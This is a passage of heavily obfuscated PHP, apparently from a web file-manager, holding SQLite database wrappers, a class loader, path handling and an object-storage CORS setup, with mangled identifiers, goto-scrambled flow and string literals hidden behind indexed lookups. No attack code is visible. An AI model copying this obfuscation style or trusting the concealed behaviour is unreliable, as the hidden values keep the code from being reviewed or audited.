$d¦Œôœ‡¼¢; $E›ºè÷– = IO::driverMake($d¦Œôœ‡¼¢); goto d˜ßø˜”ç; d˜ßø˜”ç: if ($E›ºè÷–->pathParse[$AÉ¯ºá–†ê[1005]]) { $d¦Œôœ‡¼¢ = $E›ºè÷–->pathParse[$AÉ¯ºá–†ê[1005]]; } else { $d¦Œôœ‡¼¢ = $DÒÀÊæË; } $d…ê¶Ø‘Ö = IO::copyMove($d·Œê¡Õ«´, $d¦Œôœ‡¼¢, $bæò§ï„µ‚, $FìœîíÂ„ä); $d…ê¶Ø‘Ö = $this->getPathOuter($d…ê¶Ø‘Ö); goto AÙ…›Å½ë; E¡­”­¢ŠÙ: } public function pathFather($e…Ëì¿ÂÈŒ) { return get_path_father($this->pathParse[$_SERVER[…Ò×–][75]]); } public function iconvSystem($f­­šŠ„Ãâ) { return $f­­šŠ„Ãâ; } protected function infoParse($bÄŠ´ß¸¾, $B¥ïËÎ‹Ï = false) { $eğôŸù££­ =& $_SERVER[…Ò×–]; $fš«å‹‰Ã· = $this->pathParse[$eğôŸù££­[442]][$eğôŸù££­[1030]] . $this->pathParse[$eğôŸù££­[1023]]; if ($B¥ïËÎ‹Ï) { $A¶‹‚³‡£ë = IO::infoWithChildren($fš«å‹‰Ã·); } else { $A¶‹‚³‡£ë = IO::info($fš«å‹‰Ã·); } $e‘Æ˜›ßõ„ = $this->pathParse[$eğôŸù££­[442]]; return Action($eğôŸù££­[1137])->_shareItemeParse($A¶‹‚³‡£ë, $e‘Æ˜›ßõ„); } public function listAll($Dæ‰°°„ó‘) { $eä¸×¬‚” =& $_SERVER[…Ò×–]; $BíŒõ•²„„ = IO::listAll($Dæ‰°°„ó‘); $bÊ¿¹¢Ó = $this->pathParse[$eä¸×¬‚”[442]]; foreach ($BíŒõ•²„„ as &$c¯’­…×ŒŸ) { check_abort(); $c¯’­…×ŒŸ = array_merge(IO::info($c¯’­…×ŒŸ[$eä¸×¬‚”[75]]), $c¯’­…×ŒŸ); $c¯’­…×ŒŸ[$eä¸×¬‚”[395]] = Action($eä¸×¬‚”[1137])->_shareItemeParse($c¯’­…×ŒŸ, $bÊ¿¹¢Ó); } unset($c¯’­…×ŒŸ); return $BíŒõ•²„„; } public function getPathOuter($e²‹‡“›Å‘) { goto EÙ»Î”‚¾; Aà·èëİÜÅ: $CµĞ‚‚ŸùŸ = KodIO::clear($e²‹‡“›Å‘); $DóÒ‹»®ïñ = KodIO::clear($this->pathParse[$e‹í²÷›¨[442]][$e‹í²÷›¨[1030]]); $dá÷´ÇÚË× = substr($CµĞ‚‚ŸùŸ, strlen($DóÒ‹»®ïñ)); goto EË¹Ã‰»ºĞ; EÙ»Î”‚¾: $e‹í²÷›¨ =& $_SERVER[…Ò×–]; $B–’İÑŒ¾ = KodIO::parse($e²‹‡“›Å‘); if ($B–’İÑŒ¾[$e‹í²÷›¨[29]] == KodIO::KOD_SHARE_ITEM) { return $B–’İÑŒ¾[$e‹í²÷›¨[75]]; } goto Aà·èëİÜÅ; EË¹Ã‰»ºĞ: if (substr($CµĞ‚‚ŸùŸ, 0, strlen($DóÒ‹»®ïñ)) != $DóÒ‹»®ïñ) { return !1; } return $this->pathParse[$e‹í²÷›¨[1024]] . $e‹í²÷›¨[8] . ltrim($dá÷´ÇÚË×, $e‹í²÷›¨[8]); goto Eª²Ã˜…ÀŠ; Eª²Ã˜…ÀŠ: } public function getType() { $AÚÓÆù‚‡Î =& $_SERVER[…Ò×–]; $FØ–¨§‹šä = str_replace($AÚÓÆù‚‡Î[71], $AÚÓÆù‚‡Î[33], get_class($this)); return strtolower($FØ–¨§‹šä); } public function isTypeObject($CÇÀ‰ƒì¡´) { return IO::isTypeObject($CÇÀ‰ƒì¡´); } public function info($FôôÒÛ‹ó) { return $this->infoParse($FôôÒÛ‹ó); } public function infoAuth($Cº–¹î‹´š) { return $this->infoParse($Cº–¹î‹´š); } public function infoWithChildren($DàŸÇ´Ğ‰ø) { return $this->infoParse($DàŸÇ´Ğ‰ø, !0); } public function infoFull($aêÜì“ˆÔ°) { return $this->infoParse($aêÜì“ˆÔ°); } } goto B¶ÅÛ÷ç“˜; e…Çç‰Î¨É: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto e²É©—ã§; e²É©—ã§: $a‚„Œˆ†ˆÙ =& $_SERVER[…Ò×–]; global $in, $config; $this->config =& $config; goto b¸ƒ²ô‚öÂ; b¸ƒ²ô‚öÂ: $this->in =& $in; $this->values[$a‚„Œˆ†ˆÙ[6]] =& $config; $this->values[$a‚„Œˆ†ˆÙ[7]] =& $in; goto AÔ‹µàºÁĞ; AÔ‹µàºÁĞ: $this->tpl = TEMPLATE . MOD . $a‚„Œˆ†ˆÙ[8]; $this->_classObjectID = mt_rand(0, 10000); goto e…º¶±ÚÍÊ; e…º¶±ÚÍÊ: } public function loadClass($cßÁ÷óì×Ó) { if (1 === func_num_args()) { $this->{$cßÁ÷óì×Ó} = new $cßÁ÷óì×Ó(); } else { $Bƒèª´ø«‹ = new ReflectionClass($cßÁ÷óì×Ó); $fÂĞ¤åùÂ = func_get_args(); array_shift($fÂĞ¤åùÂ); $this->{$cßÁ÷óì×Ó} = $Bƒèª´ø«‹->newInstanceArgs($fÂĞ¤åùÂ); } return $this->{$cßÁ÷óì×Ó}; } protected function assign($BõŞİ­½¿, $B©ƒÚ²âĞ§) { $this->values[$BõŞİ­½¿] = $B©ƒÚ²âĞ§; } protected function display($b˜«§ø½‘¸) { ob_end_clean(); extract($this->values); require $this->tpl . $b˜«§ø½‘¸; } } class DbSqliteBase extends Db { public function __construct($fÖŞÕÊë = '') { $aß„­ãÃ… =& $_SERVER[…Ò×–]; if (!extension_loaded($aß„­ãÃ…[9])) { think_exception(think_lang($aß„­ãÃ…[10]) . $aß„­ãÃ…[11]); } if (!empty($fÖŞÕÊë)) { if (!isset($fÖŞÕÊë[$aß„­ãÃ…[12]])) { $fÖŞÕÊë[$aß„­ãÃ…[12]] = 438; } $this->config = $fÖŞÕÊë; if (empty($this->config[$aß„­ãÃ…[13]])) { $this->config[$aß„­ãÃ…[13]] = array(); } } } public function connect($B¾ĞíŸóÆ = '', $BÖô÷–¿©Ù = 0) { $F·¶¤õùíÎ =& $_SERVER[…Ò×–]; if (!isset($this->linkID[$BÖô÷–¿©Ù])) { goto AÌ…éöÖ; DîĞÔÙ÷±’: @sqlite_busy_timeout($this->linkID[$BÖô÷–¿©Ù], 30000); if (1 != think_config($F·¶¤õùíÎ[18])) { unset($this->config); } goto aÛèÄ¡‘Ù§; Fë›ê¶‰‡ğ: $this->linkID[$BÖô÷–¿©Ù] = $DĞ¡’êñ¸Ä($B¾ĞíŸóÆ[$F·¶¤õùíÎ[17]], $B¾ĞíŸóÆ[$F·¶¤õùíÎ[12]]); if (!$this->linkID[$BÖô÷–¿©Ù]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto DîĞÔÙ÷±’; AÌ…éöÖ: if (empty($B¾ĞíŸóÆ)) { $B¾ĞíŸóÆ = $this->config; } $b¹ËÈÓÍÏ¬ = !empty($B¾ĞíŸóÆ[$F·¶¤õùíÎ[13]][$F·¶¤õùíÎ[14]]) ? $B¾ĞíŸóÆ[$F·¶¤õùíÎ[13]][$F·¶¤õùíÎ[14]] : $this->pconnect; $DĞ¡’êñ¸Ä = $b¹ËÈÓÍÏ¬ ? $F·¶¤õùíÎ[15] : $F·¶¤õùíÎ[16]; goto Fë›ê¶‰‡ğ; aÛèÄ¡‘Ù§: } return $this->linkID[$BÖô÷–¿©Ù]; } public function free() { $this->queryID = null; } public function query($D×ÓÈ£ôøÊ) { goto AÜ°…½Ç–Ï; a™¨¥‹ºˆ: think_status($bèöóÇİç×[20]); $this->queryID = sqlite_query($this->_linkID, $D×ÓÈ£ôøÊ); $this->debug(); goto c…ÀÊÇ—Æ; c…ÀÊÇ—Æ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $cì…¹ğÌÚ = $this->getAll(); return $cì…¹ğÌÚ; } goto FìÏÕˆ˜³²; E¯ÆÕ½¬“…: $this->queryStr = $D×ÓÈ£ôøÊ; if ($this->queryID) { $this->free(); } think_action_status($bèöóÇİç×[19], 1); goto a™¨¥‹ºˆ; AÜ°…½Ç–Ï: $bèöóÇİç× =& $_SERVER[…Ò×–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto E¯ÆÕ½¬“…; FìÏÕˆ˜³²: } public function execute($fëŸ´ªÅ¶) { goto FÅå»·›»; FÅå»·›»: $dàËÃÙêŞÀ =& $_SERVER[…Ò×–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto c…Æä›; FÔè‹ëëÀ©: think_status($dàËÃÙêŞÀ[20]); $bÚì¡ÖĞ’ğ = sqlite_exec($this->_linkID, $fëŸ´ªÅ¶); $this->debug(); goto cÂã‚”µ¾¡; cÂã‚”µ¾¡: if (!1 === $bÚì¡ÖĞ’ğ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto A’§™–Áâ¤; c…Æä›: $this->queryStr = $fëŸ´ªÅ¶; if ($this->queryID) { $this->free(); } think_action_status($dàËÃÙêŞÀ[21], 1); goto FÔè‹ëëÀ©; A’§™–Áâ¤: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[…Ò×–][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e»å‘•Š–í = sqlite_query($this->_linkID, $_SERVER[…Ò×–][23]); if (!$e»å‘•Š–í) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $fËŸ®àƒáÌ = sqlite_query($this->_linkID, $_SERVER[…Ò×–][24]); if (!$fËŸ®àƒáÌ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $a£‰ÕÆÒç÷ = array(); if ($this->numRows > 0) { for ($CˆÍ¢šÓ‚˜ = 0; $CˆÍ¢šÓ‚˜ < $this->numRows; $CˆÍ¢šÓ‚˜++) { $a£‰ÕÆÒç÷[$CˆÍ¢šÓ‚˜] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $a£‰ÕÆÒç÷; } public function getFields($f¥¯óæ İ) { $f„áÙ÷ïñ® =& $_SERVER[…Ò×–]; $AÈáÀõÈÈå = $this->query($f„áÙ÷ïñ®[25] . $f¥¯óæ İ . $f„áÙ÷ïñ®[26]); $EƒçĞÖ¼†Î = array(); if ($AÈáÀõÈÈå) { foreach ($AÈáÀõÈÈå as $F—©ã—Ì¥£ => $Aš§ì £) { $EƒçĞÖ¼†Î[$Aš§ì £[$f„áÙ÷ïñ®[27]]] = array($f„áÙ÷ïñ®[28] => $Aš§ì £[$f„áÙ÷ïñ®[27]], $f„áÙ÷ïñ®[29] => $Aš§ì £[$f„áÙ÷ïñ®[30]], $f„áÙ÷ïñ®[31] => (bool) ($Aš§ì £[$f„áÙ÷ïñ®[32]] === $f„áÙ÷ïñ®[33]), $f„áÙ÷ïñ®[34] => $Aš§ì £[$f„áÙ÷ïñ®[35]], $f„áÙ÷ïñ®[36] => strtolower($Aš§ì £[$f„áÙ÷ïñ®[37]]) == $f„áÙ÷ïñ®[38], $f„áÙ÷ïñ®[39] => strtolower($Aš§ì £[$f„áÙ÷ïñ®[40]]) == $f„áÙ÷ïñ®[41]); } } return $EƒçĞÖ¼†Î; } public function getTables($c‘‚˜˜É‰Ó = '') { $a…ˆîĞ£ =& $_SERVER[…Ò×–]; $FÏ¦™ŒÒø‡ = $this->query($a…ˆîĞ£[42] . $a…ˆîĞ£[43] . $a…ˆîĞ£[44]); $AêƒÌ–ãç­ = array(); foreach ($FÏ¦™ŒÒø‡ as $Eœ‹äñ–äÀ => $D„÷”î) { $AêƒÌ–ãç­[$Eœ‹äñ–äÀ] = current($D„÷”î); } return $AêƒÌ–ãç­; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $f¼µğ”æ¹– =& $_SERVER[…Ò×–]; $B×ƒí¹ù§Š = sqlite_last_error($this->_linkID); $this->error = $B×ƒí¹ù§Š . $f¼µğ”æ¹–[4] . sqlite_error_string($B×ƒí¹ù§Š); if ($f¼µğ”æ¹–[33] != $this->queryStr) { $this->error .= LNG($f¼µğ”æ¹–[45]) . $this->queryStr; } think_trace($this->error, $f¼µğ”æ¹–[33], $f¼µğ”æ¹–[46]); return $this->error; } public function escapeString($A¤ãÎù±…Ò) { return sqlite_escape_string($A¤ãÎù±…Ò); } public function parseLimit($FµØ©Ôö›) { $cÁåñ‘Ø©• =& $_SERVER[…Ò×–]; $d‚ĞŠÌÑ„÷ = $cÁåñ‘Ø©•[33]; if (!empty($FµØ©Ôö›)) { $FµØ©Ôö› = explode($cÁåñ‘Ø©•[47], $FµØ©Ôö›); if (count($FµØ©Ôö›) > 1) { $d‚ĞŠÌÑ„÷ .= $cÁåñ‘Ø©•[48] . $FµØ©Ôö›[1] . $cÁåñ‘Ø©•[49] . $FµØ©Ôö›[0] . $cÁåñ‘Ø©•[50]; } else { $d‚ĞŠÌÑ„÷ .= $cÁåñ‘Ø©•[48] . $FµØ©Ôö›[0] . $cÁåñ‘Ø©•[50]; } } return $d‚ĞŠÌÑ„÷; } } class DbSqlite3Base extends Db { public function __construct($eÉ§œèî’ = '') { $bÊ«êÕÅ‘´ =& $_SERVER[…Ò×–]; if (!class_exists($bÊ«êÕÅ‘´[51])) { think_exception(think_lang($bÊ«êÕÅ‘´[10]) . $bÊ«êÕÅ‘´[52]); } if (!empty($eÉ§œèî’)) { if (!isset($eÉ§œèî’[$bÊ«êÕÅ‘´[12]])) { $eÉ§œèî’[$bÊ«êÕÅ‘´[12]] = 438; } $this->config = $eÉ§œèî’; if (empty($this->config[$bÊ«êÕÅ‘´[13]])) { $this->config[$bÊ«êÕÅ‘´[13]] = array(); } } } public function connect($fƒ®»ê«÷  = '', $BÛÛùÑ‹Ñ = 0) { $E¾Ñ¼œè‰† =& $_SERVER[…Ò×–]; if (!isset($this->linkID[$BÛÛùÑ‹Ñ])) { if (empty($fƒ®»ê«÷ )) { $fƒ®»ê«÷  = $this->config; } $this->linkID[$BÛÛùÑ‹Ñ] = new SQLite3($fƒ®»ê«÷ [$E¾Ñ¼œè‰†[17]]); if (!$this->linkID[$BÛÛùÑ‹Ñ]) { think_exception($this->linkID[$BÛÛùÑ‹Ñ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$BÛÛùÑ‹Ñ]->busyTimeout(30000); if (1 != think_config($E¾Ñ¼œè‰†[18])) { unset($this->config); } } return $this->linkID[$BÛÛùÑ‹Ñ]; } public function free() { $this->queryID = null; } public function query($d –†ëòºõ) { goto dÙËˆÇµğ ; dÙËˆÇµğ : $DÖøƒÉŠ˜È =& $_SERVER[…Ò×–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto FÊàŠö»–ë; dŞ–¿±Ç‰Ğ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $E™ÔØÀßµ÷ = $this->getAll(); $this->numRows = count($E™ÔØÀßµ÷); return $E™ÔØÀßµ÷; } goto D–µĞì½íï; FÊàŠö»–ë: $this->queryStr = $d –†ëòºõ; if ($this->queryID) { $this->free(); } think_action_status($DÖøƒÉŠ˜È[19], 1); goto CäÙâÒŸÃ—; CäÙâÒŸÃ—: think_status($DÖøƒÉŠ˜È[20]); $this->queryID = $this->_linkID->query($d –†ëòºõ); $this->debug(); goto dŞ–¿±Ç‰Ğ; D–µĞì½íï: } public function execute($aŸæÇ©Ç¢’) { goto e—Š¥ß“Ë¤; Fø¶¶¬¨‹Â: $this->queryStr = $aŸæÇ©Ç¢’; if ($this->queryID) { $this->free(); } think_action_status($bĞĞÆ¿†Ö[21], 1); goto fé‚Îóƒ‰•; A„Ò±ß±ÜŞ: if (!1 === $CÔ¹Æ‡¼Ûì) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto C ´‰»°; e—Š¥ß“Ë¤: $bĞĞÆ¿†Ö =& $_SERVER[…Ò×–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Fø¶¶¬¨‹Â; fé‚Îóƒ‰•: think_status($bĞĞÆ¿†Ö[20]); $CÔ¹Æ‡¼Ûì = $this->_linkID->exec($aŸæÇ©Ç¢’); $this->debug(); goto A„Ò±ß±ÜŞ; C ´‰»°: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[…Ò×–][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EèÚ æ­œ— = $this->_linkID->query($_SERVER[…Ò×–][23]); if (!$EèÚ æ­œ—) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $F‰™–Õ‰´ = $this->_linkID->query($_SERVER[…Ò×–][24]); if (!$F‰™–Õ‰´) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $B¥›Å‰·¾æ = array(); while ($añãÚïÈ¢ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $B¥›Å‰·¾æ[] = $añãÚïÈ¢; } $this->queryID->reset(); return $B¥›Å‰·¾æ; } public function getFields($dÉï«ÏğÜ) { $fóÅœ¸ÜªÃ =& $_SERVER[…Ò×–]; $F–Ÿ±©‰à‡ = $this->query($fóÅœ¸ÜªÃ[25] . $dÉï«ÏğÜ . $fóÅœ¸ÜªÃ[26]); $c‘÷…™¡ë’ = array(); if ($F–Ÿ±©‰à‡) { foreach ($F–Ÿ±©‰à‡ as $dĞÍ–ĞÌ½ => $eÉ´Ûãäáä) { $c‘÷…™¡ë’[$eÉ´Ûãäáä[$fóÅœ¸ÜªÃ[28]]] = array($fóÅœ¸ÜªÃ[28] => $eÉ´Ûãäáä[$fóÅœ¸ÜªÃ[28]], $fóÅœ¸ÜªÃ[29] => $eÉ´Ûãäáä[$fóÅœ¸ÜªÃ[29]], $fóÅœ¸ÜªÃ[31] => (bool) ($eÉ´Ûãäáä[$fóÅœ¸ÜªÃ[31]] === $fóÅœ¸ÜªÃ[33]), $fóÅœ¸ÜªÃ[34] => $eÉ´Ûãäáä[$fóÅœ¸ÜªÃ[53]], $fóÅœ¸ÜªÃ[36] => (bool) $eÉ´Ûãäáä[$fóÅœ¸ÜªÃ[54]], $fóÅœ¸ÜªÃ[39] => (bool) $eÉ´Ûãäáä[$fóÅœ¸ÜªÃ[54]]); } } return $c‘÷…™¡ë’; } public function getTables($F ÀŒ¬Îæ = '') { $cÉÔè øšø =& $_SERVER[…Ò×–]; $aäßÊÇˆÙš = $this->query($cÉÔè øšø[42] . $cÉÔè øšø[43] . $cÉÔè øšø[44]); $c­ö‡ŞÈÀ¯ = array(); foreach ($aäßÊÇˆÙš as $BÒæ¢³²ÚÉ => $A¬™Â¸äˆÀ) { $c­ö‡ŞÈÀ¯[$BÒæ¢³²ÚÉ] = current($A¬™Â¸äˆÀ); } return $c­ö‡ŞÈÀ¯; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $EÀ¿„Ë« =& $_SERVER[…Ò×–]; $this->error = $this->_linkID->lastErrorMsg(); if ($EÀ¿„Ë«[33] != $this->queryStr) { $this->error .= LNG($EÀ¿„Ë«[45]) . $this->queryStr; } think_trace($this->error, $EÀ¿„Ë«[33], $EÀ¿„Ë«[46]); return $this->error; } public function escapeString($AªĞ…É—°) { $d ‡‚Ã««é =& $_SERVER[…Ò×–]; if ($this->_linkID) { return $this->_linkID->escapeString($AªĞ…É—°); } return str_ireplace($d ‡‚Ã««é[55], $d ‡‚Ã««é[56], $AªĞ…É—°); } public function parseLimit($EÌàÕ±³º) { $FÂ¾÷®ÈéÌ =& $_SERVER[…Ò×–]; $e‡Ü³¹ÌƒÚ = $FÂ¾÷®ÈéÌ[33]; if (!empty($EÌàÕ±³º)) { $EÌàÕ±³º = explode($FÂ¾÷®ÈéÌ[47], $EÌàÕ±³º); if (count($EÌàÕ±³º) > 1) { $e‡Ü³¹ÌƒÚ .= $FÂ¾÷®ÈéÌ[48] . $EÌàÕ±³º[1] . $FÂ¾÷®ÈéÌ[49] . $EÌàÕ±³º[0] . $FÂ¾÷®ÈéÌ[50]; } else { $e‡Ü³¹ÌƒÚ .= $FÂ¾÷®ÈéÌ[48] . $EÌàÕ±³º[0] . $FÂ¾÷®ÈéÌ[50]; } } return $e‡Ü³¹ÌƒÚ; } } goto aÉ™ä„ö; D¢ÜŠÄÑ°Æ: function Action($c×¨„õÜŒ = '') { goto DŒé—áÃö; Bä‹æï½’Œ: if (isset($cçÆŠ›Î£[$Eñ¹¹‡Ä¦©])) { return $cçÆŠ›Î£[$Eñ¹¹‡Ä¦©]; } $c×¨„õÜŒ = trim(str_replace($fä»÷ ¯é[4], $fä»÷ ¯é[5], $c×¨„õÜŒ), $fä»÷ ¯é[4]); $eÁåµèÇ½‘ = explode($fä»÷ ¯é[5], $c×¨„õÜŒ); goto fœ°òÆ¶ù‘; DŒé—áÃö: $fä»÷ ¯é =& $_SERVER[ä¡—±€µó–è]; static $cçÆŠ›Î£ = array(); $Eñ¹¹‡Ä¦© = $c×¨„õÜŒ; goto Bä‹æï½’Œ; CÏËŒØÊ‹Ó: if (isset($cçÆŠ›Î£[$d”›ˆ½ä–œ])) { return $cçÆŠ›Î£[$d”›ˆ½ä–œ]; } if (is_file($E¸½ÚßÛ—Š)) { include_once $E¸½ÚßÛ—Š; } if (!class_exists($bâã¥¸Ëõ)) { return actionCallError("\133{$c×¨„õÜŒ}\x20\75\x3e\40{$bâã¥¸Ëõ}\x5d\x20\143\x6c\x61\163\163\x20\x6e\x6f\x74\x20\145\170\x69\x73\x74\x73\41"); } goto F²æ¥œ¼áß; fœ°òÆ¶ù‘: $f–¥†Ü¤â„ = strtolower($eÁåµèÇ½‘[0]); if (substr($f–¥†Ü¤â„, -6) == $fä»÷ ¯é[6]) { $c×¨„õÜŒ = substr($eÁåµèÇ½‘[0], 0, -6); $bâã¥¸Ëõ = $c×¨„õÜŒ . $fä»÷ ¯é[7]; $E¸½ÚßÛ—Š = $fä»÷ ¯é[8]; if (isset($eÁåµèÇ½‘[1]) && substr(strtolower($eÁåµèÇ½‘[1]), -5) == $fä»÷ ¯é[9]) { $bâã¥¸Ëõ = $c×¨„õÜŒ . $eÁåµèÇ½‘[1]; $E¸½ÚßÛ—Š = $fä»÷ ¯é[10] . $eÁåµèÇ½‘[1] . $fä»÷ ¯é[11]; } else { if (count($eÁåµèÇ½‘) == 3) { $bâã¥¸Ëõ = $c×¨„õÜŒ . $eÁåµèÇ½‘[1] . $eÁåµèÇ½‘[2]; $E¸½ÚßÛ—Š = $fä»÷ ¯é[12] . $eÁåµèÇ½‘[1] . $fä»÷ ¯é[13] . $eÁåµèÇ½‘[2] . $fä»÷ ¯é[11]; } } $E¸½ÚßÛ—Š = PLUGIN_DIR . $c×¨„õÜŒ . $fä»÷ ¯é[4] . $E¸½ÚßÛ—Š; } else { if (substr($f–¥†Ü¤â„, -5) == $fä»÷ ¯é[9]) { $c×¨„õÜŒ = substr($eÁåµèÇ½‘[0], 0, -5); return Model($c×¨„õÜŒ); } else { $bâã¥¸Ëõ = $eÁåµèÇ½‘[0] . $eÁåµèÇ½‘[1]; $E¸½ÚßÛ—Š = CONTROLLER_DIR . $eÁåµèÇ½‘[0] . $fä»÷ ¯é[4] . $eÁåµèÇ½‘[1] . $fä»÷ ¯é[14]; } } $d”›ˆ½ä–œ = strtolower($bâã¥¸Ëõ); goto CÏËŒØÊ‹Ó; F²æ¥œ¼áß: $cçÆŠ›Î£[$d”›ˆ½ä–œ] = new $bâã¥¸Ëõ(); $cçÆŠ›Î£[$Eñ¹¹‡Ä¦©] = $cçÆŠ›Î£[$d”›ˆ½ä–œ]; return $cçÆŠ›Î£[$d”›ˆ½ä–œ]; goto d«—ƒÂâÍŒ; d«—ƒÂâÍŒ: } function ActionApply($còØ“ğÂŞ , $e‰¹Šñ…å‘ = array()) { goto Cµ’¯¥Ÿê»; Bƒ¯Âˆ´ ¨: if (!is_object($D‹£›ˆ·ÆÏ) || !method_exists($D‹£›ˆ·ÆÏ, $dâÃç–„Ÿâ)) { return actionCallError("{$còØ“ğÂŞ }\40\x6d\145\164\150\157\144\40\x6e\x6f\164\40\145\x78\x69\x73\164\163\x21"); } $D§¬ô­ë‚ª = call_user_func_array(array($D‹£›ˆ·ÆÏ, $dâÃç–„Ÿâ), $e‰¹Šñ…å‘); return $D§¬ô­ë‚ª; goto b´çƒèÏ; cÔçøèˆõó: $eƒ¢Å …¹ = substr($còØ“ğÂŞ , 0, $dˆ³Î•©±); $dâÃç–„Ÿâ = substr($còØ“ğÂŞ , $dˆ³Î•©± + 1); $D‹£›ˆ·ÆÏ = Action($eƒ¢Å …¹); goto Bƒ¯Âˆ´ ¨; Cµ’¯¥Ÿê»: if (is_array($còØ“ğÂŞ )) { return call_user_func_array($còØ“ğÂŞ , $e‰¹Šñ…å‘); } if (function_exists($còØ“ğÂŞ )) { return call_user_func_array($còØ“ğÂŞ , $e‰¹Šñ…å‘); } $dˆ³Î•©± = strrpos($còØ“ğÂŞ , $_SERVER[ä¡—±€µó–è][5]); goto cÔçøèˆõó; b´çƒèÏ: } function actionCallError($cÓ¦ˆ¶º‚ã) { return write_log($cÓ¦ˆ¶º‚ã, $_SERVER[ä¡—±€µó–è][15]); } goto f™±«öÄ; F»¦‚æÌË¿: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($b±é¯¯¾¾Æ) { parent::__construct(); include_once SDK_DIR . $_SERVER[…Ò×–][1183]; $this->_init($b±é¯¯¾¾Æ); } public function _init($E‘ÖÛ’ê) { $Aé˜£ğ­¡ =& $_SERVER[…Ò×–]; foreach ($E‘ÖÛ’ê as $DÙ–ºö‹ˆç => $a†ˆ¨àÈÚÅ) { if (isset($this->{$DÙ–ºö‹ˆç})) { $this->{$DÙ–ºö‹ˆç} = $a†ˆ¨àÈÚÅ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Aé˜£ğ­¡[1184] . LNG($Aé˜£ğ­¡[1185])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto E¾Î©…®–; E¾Î©…®–: $aÏÏ†Šªí =& $_SERVER[…Ò×–]; $b½§åâ ¾‘ = new OSS\Model\CorsConfig(); $b¡ß³É“Ò = new OSS\Model\CorsRule(); goto bŸõÑù¹; FŸñ‡Ó³Ÿ›: $b½§åâ ¾‘->addRule($b¡ß³É“Ò); try { $this->client->putBucketCors($this->bucket, $b½§åâ ¾‘); } catch (OSS\Core\OssException $Fâ²í‚ºÂ) { return !1; } return !0; goto Cò†ëÆùˆù; bŸõÑù¹: $b¡ß³É“Ò->addAllowedOrigin($aÏÏ†Šªí[1186]); $b¡ß³É“Ò->addAllowedMethod($aÏÏ†Šªí[1187]); $b¡ß³É“Ò->addAllowedMethod($aÏÏ†Šªí[1188]); goto Cª‹åÖƒùĞ; Cª‹åÖƒùĞ: $b¡ß³É“Ò->addAllowedMethod($aÏÏ†Šªí[1189]); $b¡ß³É“Ò->addAllowedMethod($aÏÏ†Šªí[1190]); $b¡ß³É“Ò->addAllowedMethod($aÏÏ†Šªí[155]); goto fî„÷ˆ‹õä; fî„÷ˆ‹õä: $b¡ß³É“Ò->setMaxAgeSeconds(600); $b¡ß³É“Ò->addExposeHeader($aÏÏ†Šªí[1191]); $b¡ß³É“Ò->addAllowedHeader($aÏÏ†Šªí[1186]); goto FŸñ‡Ó³Ÿ›; Cò†ëÆùˆù: } public function getBucketCors() { goto Eñ Ïß»Ñ; fÒÄ¶±†ªÉ: if (!$d†å÷çé || !($Bñëİ©Â²¨ = $d†å÷çé->getRules())) { return null; } $d’âîö¨âÇ = $Bñëİ©Â²¨[0]->getAllowedOrigins(); $d›¢ÌÜ…Ëƒ = $Bñëİ©Â²¨[0]->getAllowedMethods(); goto B åÂŠİÏÂ; Eñ Ïß»Ñ: $a×ìÉÜƒ’ =& $_SERVER[…Ò×–]; $d†å÷çé = null; try { $d†å÷çé = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $dŸ®Ğæ«Œ—) { return null; } goto fÒÄ¶±†ªÉ; B åÂŠİÏÂ: $bÙØÒ›†¤¼ = $Bñëİ©Â²¨[0]->getMaxAgeSeconds(); $dÃÎàöš‡ = $Bñëİ©Â²¨[0]->getExposeHeaders(); $aÕ†°„íñ = $Bñëİ©Â²¨[0]->getAllowedHeaders(); goto e¨‹íÃÄ…; e¨‹íÃÄ…: return array($a×ìÉÜƒ’[179] => isset($d’âîö¨âÇ[0]) ? $d’âîö¨âÇ[0] : $a×ìÉÜƒ’[33], $a×ìÉÜƒ’[183] => $d›¢ÌÜ…Ëƒ, $a×ìÉÜƒ’[1192] => $bÙØÒ›†¤¼, $a×ìÉÜƒ’[1193] => isset($dÃÎàöš‡[0]) ? $dÃÎàöš‡[0] : $a×ìÉÜƒ’[33], $a×ìÉÜƒ’[181] => isset($aÕ†°„íñ[0]) ? $aÕ†°„íñ[0] : $a×ìÉÜƒ’[33]); goto bß‡É˜÷; bß‡É˜÷: } public function 